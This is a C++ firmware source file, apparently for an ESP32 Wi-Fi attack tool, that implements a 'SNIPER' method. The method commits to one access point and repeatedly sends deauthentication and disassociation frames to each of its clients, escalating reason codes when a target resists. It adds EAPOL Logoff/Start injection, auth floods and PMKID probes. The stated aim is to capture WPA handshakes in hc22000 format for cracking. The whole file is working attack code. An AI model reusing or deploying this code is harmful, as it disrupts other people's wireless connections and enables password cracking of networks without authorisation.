// "SNIPER" capture method - one target, one aim, no spray.
//
// Every other method in this folder works *per tick* on whatever the beacon
// table holds (ALL/PAN broadcast or sweep the channel, HERD round-robins,
// FOCUS/eViL score-and-move). SNIPER instead commits to a SINGLE access point
// and stays on it until something real changes:
//
//   * a handshake at the current HS DEPTH is complete  -> stand down, let the
//     sniffer's lock release and the bar move on;
//   * the target stops being visible / leaves the table -> re-pick;
//   * too many strikes with no EAPOL-mask progress      -> re-pick (stubborn);
//   * lock-on-BSSID is armed                           -> that target wins
//     outright and is NEVER abandoned (the sniffer is holding its channel).
//
// Two things it does that no existing method does:
//   1. per-CLIENT precision strike, rotating through the target's known
//      clients instead of always hitting clients[0] or a broadcast address;
//   2. REASON ESCALATION - the first strikes use ctx.deauthReason (the RADIO
//      knob, so packs keep composing), but a target that resists gets a
//      rotating set of harder reasons (2 = prev-auth-invalid, 7 = class-3
//      frame, 15 = 4-way timeout) before we give up on it.
//
// All state lives in module-level statics, wiped by resetSniperState() on
// session start/stop. We never touch sniffer.cpp internals - everything comes
// through the read-only Ctx, exactly like the other methods in this folder.
#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <esp_random.h>
#include <string.h>

namespace Cap {
namespace Methods {

static const uint8_t  SNIPER_SLOTS = 16;
static const uint32_t HOLD_MS      = 45000;  // how long a non-locked target is kept
static const uint8_t  MISS_LIMIT   = 4;      // strikes with no mask progress -> move on
static const uint32_t MIN_STRIKE_GAP_MS = 2500;

// Per-target memory: last EAPOL mask we saw, how many strikes produced no
// progress, and when it was last visible. Same idea as eViL's hunt log, but
// scoped to the single target we are currently committed to.
struct SniperEntry {
    uint8_t  bssid[6];
    uint8_t  lastMask;
    uint8_t  misses;
    uint32_t lastSeenMs;
    bool     used;
};
static SniperEntry s_log[SNIPER_SLOTS];

static uint8_t  s_target[6]    = {};
static bool     s_locked       = false;   // target came from lock-on-BSSID
static uint32_t s_targetUntil  = 0;
static uint32_t s_lastStrikeMs = 0;
static uint32_t s_lastProbeMs  = 0;
static uint8_t  s_cliIdx       = 0;       // rotating client index within the target
static uint8_t  s_escalateIdx  = 0;

static bool isZeroMac(const uint8_t* m) {
    if (!m) return true;
    for (uint8_t i = 0; i < 6; i++) {
        if (m[i] != 0) return false;
    }
    return true;
}

static void bump(const Ctx& ctx) {
    if (ctx.framesDeauth) (*ctx.framesDeauth)++;
}

// Random inter-frame jitter, shaped by the JITTER MS knob (0 = off). Kept
// tiny on purpose: this runs in the sniffer's loop context.
static void jitterPause(uint8_t jitterMs) {
    if (!jitterMs) return;
    delay((uint16_t)(esp_random() % (uint16_t)(jitterMs + 1)));
}

static SniperEntry* logFor(const uint8_t* bssid) {
    for (uint8_t i = 0; i < SNIPER_SLOTS; i++) {
        if (s_log[i].used && memcmp(s_log[i].bssid, bssid, 6) == 0) return &s_log[i];
    }
    for (uint8_t i = 0; i < SNIPER_SLOTS; i++) {
        if (!s_log[i].used) {
            memset(&s_log[i], 0, sizeof(s_log[i]));
            memcpy(s_log[i].bssid, bssid, 6);
            s_log[i].used = true;
            return &s_log[i];
        }
    }
    // Pool full - recycle the one we have not seen for the longest time.
    uint8_t worst = 0;
    uint32_t worstSeen = UINT32_MAX;
    for (uint8_t i = 0; i < SNIPER_SLOTS; i++) {
        if (s_log[i].lastSeenMs < worstSeen) {
            worstSeen = s_log[i].lastSeenMs;
            worst = i;
        }
    }
    memset(&s_log[worst], 0, sizeof(s_log[worst]));
    memcpy(s_log[worst].bssid, bssid, 6);
    s_log[worst].used = true;
    return &s_log[worst];
}

// Read-only lookup (unlike logFor, never creates or recycles an entry).
static const SniperEntry* logFind(const uint8_t* bssid) {
    for (uint8_t i = 0; i < SNIPER_SLOTS; i++) {
        if (s_log[i].used && memcmp(s_log[i].bssid, bssid, 6) == 0) return &s_log[i];
    }
    return nullptr;
}

// Strikes since the last EAPOL-mask progress for the target we are committed
// to. 0 when the target isn't tracked yet.
static uint8_t missesOf() {
    const SniperEntry* e = logFind(s_target);
    return e ? e->misses : 0;
}

static const BeaconSlot* findBeacon(const Ctx& ctx, const uint8_t* bssid) {
    if (!ctx.beacons) return nullptr;
    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        if (memcmp(ctx.beacons[i].bssid, bssid, 6) == 0) return &ctx.beacons[i];
    }
    return nullptr;
}

// Shared eligibility gate. Every "should we attack this AP" question goes
// through here so SNIPER can never send at our own AP, a pinned-away AP, a
// session-skipped (Z) AP, an AP below the RSSI floor, or one that already
// produced a handshake at the current HS DEPTH.
static bool eligible(const Ctx& ctx, const BeaconSlot& b) {
    if (b.channel != ctx.channel) return false;
    if (ctx.isOwnAp && ctx.isOwnAp(b.bssid)) return false;
    if (ctx.skipPin && ctx.skipPin(b.bssid)) return false;
    if (ctx.isSkipped && ctx.isSkipped(b.bssid)) return false;
    if (b.rssi < ctx.minRssi) return false;
    if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) return false;
    return true;
}

static void clearTarget() {
    memset(s_target, 0, sizeof(s_target));
    s_locked = false;
    s_targetUntil = 0;
    s_cliIdx = 0;
    s_escalateIdx = 0;
}

static bool targetVisible(const Ctx& ctx) {
    return findBeacon(ctx, s_target) != nullptr;
}

// Pick the single AP we will commit to.
// Priority 1: the sniffer's lock-on-BSSID target - it is already parked on
//             that AP's channel waiting for M2/M3/M4, so anything else would
//             be wasted airtime. Never abandoned while the lock holds.
// Priority 2: the strongest eligible AP with at least one known client - a
//             4-way handshake needs a station, so a clientless AP is a bad
//             bet for a method that refuses to spray.
static void pickTarget(const Ctx& ctx, uint32_t now) {
    if (ctx.lockedBssidActive && !isZeroMac(ctx.lockedBssid)) {
        memcpy(s_target, ctx.lockedBssid, 6);
        s_locked = true;
        s_targetUntil = now + HOLD_MS;
        s_cliIdx = 0;
        s_escalateIdx = 0;
        return;
    }

    int best = -1;
    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        const BeaconSlot& b = ctx.beacons[i];
        if (!b.ssid[0]) continue;      // hidden SSID cannot carry a crackable hash
        if (b.clientN == 0) continue;  // no station => no handshake to catch
        if (!eligible(ctx, b)) continue;
        if (best < 0 || b.rssi > ctx.beacons[best].rssi) best = i;
    }
    if (best < 0) {
        clearTarget();
        return;
    }
    memcpy(s_target, ctx.beacons[best].bssid, 6);
    s_locked = false;
    s_targetUntil = now + HOLD_MS;
    s_cliIdx = 0;
    s_escalateIdx = 0;
}

// Reasons used once the target proves stubborn. First strikes always use the
// RADIO REASON knob (ctx.deauthReason) so packs stay composable; only a
// resisting target sees this rotation.
static uint8_t escalatedReason(uint8_t misses) {
    static const uint8_t kEsc[] = {2, 7, 15};  // prev-auth-invalid / class-3 / 4-way timeout
    uint8_t idx = (uint8_t)((misses + s_escalateIdx) % 3);
    return kEsc[idx];
}

// One aimed strike at s_target: per-client deauth + disassoc, plus the
// EAPOL-Start/Logoff pair when the EAPOL TX knob is on. Returns true if at
// least one frame went out, so the caller can update the miss counter.
static bool strike(const Ctx& ctx, const BeaconSlot& b) {
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    if (rounds > 3) rounds = 3;   // precision method: never a 5-frame wall of noise

    // Rotate through the target's known clients. A handshake is completed by a
    // station, so hitting each associated client once beats re-hitting the
    // first one we happened to see.
    const uint8_t* client = nullptr;
    if (b.clientN > 0) {
        if (s_cliIdx >= b.clientN) s_cliIdx = 0;
        client = b.clients[s_cliIdx];
        s_cliIdx = (uint8_t)((s_cliIdx + 1) % b.clientN);
    }

    uint8_t miss = missesOf();
    uint8_t reason = (miss >= 2) ? escalatedReason(miss) : ctx.deauthReason;
    if (miss >= 2) s_escalateIdx++;   // vary the reason between strikes, not just repeat it
    bool sent = false;

    for (uint8_t r = 0; r < rounds; r++) {
        if (!ctx.bidirKick) break;  // BIDIR off == "no deauth at all"; only the flood below may run
        // Target the named station when we have one, else the last client the
        // sniffer kicked, else a broadcast address. sendDeauthFrame() puts this
        // into addr1, so a real station gets a frame addressed to it - far more
        // likely to be honored than one sprayed at the channel.
        // (It also re-sets the channel, which is a no-op here: we only ever
        // commit to an AP whose channel == ctx.channel.)
        const uint8_t* dest = client ? client
                                     : ((ctx.kickStaOk && ctx.kickSta) ? ctx.kickSta : ctx.bcast);
        if (WSLBypasser::sendDeauthFrame(b.bssid, b.channel, dest, reason)) {
            bump(ctx);
            sent = true;
        }
        jitterPause(ctx.jitterMs);
        delay(WSLBypasser::burstLegGapMs());
        if (WSLBypasser::sendDisassocFrame(b.bssid, b.channel, dest, reason)) {
            bump(ctx);
            sent = true;
        }
        if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
    }

    // EAPOL-Start is what makes a station run the 4-way again without waiting
    // for a rekey; Logoff first makes the AP forget it, so the start is clean.
    if (ctx.eapolTx && client) {
        if (WSLBypasser::sendEAPOLLogoff(b.bssid, client)) {
            bump(ctx);
            sent = true;
        }
        jitterPause(ctx.jitterMs);
        if (WSLBypasser::sendEAPOLStart(b.bssid, client)) {
            bump(ctx);
            sent = true;
        }
    }

    // AUTH FLOOD escalation only when the target has no clients we can name -
    // same rule the other methods use, just scoped to one AP.
    if (ctx.authFlood && b.clientN == 0) {
        if (WSLBypasser::sendAuthFlood(b.bssid, 4)) {
            bump(ctx);
            sent = true;
        }
    }
    return sent;
}

// Kick entry point - dispatched on every kick tick (~400 ms while locked or
// pinned, once per channel change while hopping).
void sniper(const Ctx& ctx) {
    // STEALTH guard, same rule as ALL/CLIENTS/eViL: with BIDIR and AUTH FLOOD
    // both off the user asked for "no deauth at all", so this stays silent.
    // (The PMKID probe below is not a deauth and keeps running.)
    if (!ctx.bidirKick && !ctx.authFlood) return;

    uint32_t now = millis();

    if (isZeroMac(s_target)) pickTarget(ctx, now);
    if (isZeroMac(s_target)) return;

    // Committed-target bookkeeping. A target handed to us by lock-on-BSSID is
    // never dropped here: the sniffer is parked on its channel precisely to
    // finish that handshake, so we stay on it.
    if (!s_locked) {
        if (!targetVisible(ctx) || now >= s_targetUntil) {
            clearTarget();
        } else {
            const SniperEntry* e = logFind(s_target);
            if (e && e->misses >= MISS_LIMIT) clearTarget();  // stubborn -> try another AP
        }
        if (isZeroMac(s_target)) {
            pickTarget(ctx, now);
            if (isZeroMac(s_target)) return;
        }
    }

    const BeaconSlot* b = findBeacon(ctx, s_target);
    if (!b) return;   // not on our channel this tick

    // Done at the current HS DEPTH -> stand down. The sniffer releases its own
    // lock on the same condition, so the next tick may pick a fresh target.
    if (Hc22000::hasHandshake(s_target, ctx.hsDepth)) {
        clearTarget();
        return;
    }
    if (!eligible(ctx, *b)) return;
    if (!b->ssid[0]) return;                     // nothing to derive a hash from
    if (b->clientN == 0 && !ctx.authFlood) return; // no station named and no flood -> wait

    // Airtime pacing: COOLDOWN (with a sane floor) between strikes at one AP.
    // SNIPER is deliberately slower than the spraying methods.
    uint32_t gap = (uint32_t)ctx.cooldownSec * 1000u;
    if (gap < MIN_STRIKE_GAP_MS) gap = MIN_STRIKE_GAP_MS;
    if (now - s_lastStrikeMs < gap) return;

    // Progress check: a strike that moves the EAPOL mask is working, one that
    // does not is what eventually makes us walk away from a non-locked target.
    SniperEntry* e = logFor(s_target);
    uint8_t maskBefore = Hc22000::handshakeMask(s_target);

    if (!strike(ctx, *b)) return;
    s_lastStrikeMs = millis();

    uint8_t maskAfter = Hc22000::handshakeMask(s_target);
    if (e) {
        e->lastSeenMs = now;
        if (maskAfter != maskBefore || maskAfter != e->lastMask) {
            e->lastMask = maskAfter;
            e->misses = 0;   // the target is cooperating - keep the pressure on
        } else if (e->misses < 0xFF) {
            e->misses++;
        }
    }
}

// PMKID probe - the dispatcher calls this right after kick() on the same tick,
// so it must honour ctx.pmkidProbe itself (like pmkidProbe() in CLIENTS).
void sniperProbe(const Ctx& ctx) {
    if (!ctx.pmkidProbe) return;
    if (isZeroMac(s_target)) return;
    if (Hc22000::hasPair(s_target)) return;   // already crackable - stop knocking

    const BeaconSlot* b = findBeacon(ctx, s_target);
    if (!b || !b->ssid[0]) return;

    uint32_t now = millis();
    if (now - s_lastProbeMs < 3000) return;   // one probe per target every 3 s
    s_lastProbeMs = now;

    // Open-System auth + association attempt: works even against PMF-capable
    // APs, because it is a real association attempt, not a forged deauth.
    if (WSLBypasser::sendAuthentication(s_target)) bump(ctx);
    delay(2);
    if (WSLBypasser::sendAssociationRequest(s_target, b->ssid)) bump(ctx);
}

// Session boundary: Methods::resetAll() calls this on capture start and stop,
// so no state can leak between runs.
void resetSniperState() {
    memset(s_log, 0, sizeof(s_log));
    clearTarget();
    s_lastStrikeMs = 0;
    s_lastProbeMs = 0;
}

// RADIO knobs this method reads from Ctx - drives RADIO -> EDIT:
// 9=KICK N 10=BIDIR 11=EAPOL TX 12=PMKID 14=AUTH FLOOD 15=REASON
// 20=JITTER MS 21=COOLDOWN. HS DEPTH / ATK RSSI live on the shared top page.
static const uint8_t sniperKnobs[] = {9, 10, 11, 12, 14, 15, 20, 21, 0};

CAP_METHOD_REGISTER("SNIPER", sniper, sniperProbe, resetSniperState, sniperKnobs)

} // namespace Methods
} // namespace Cap
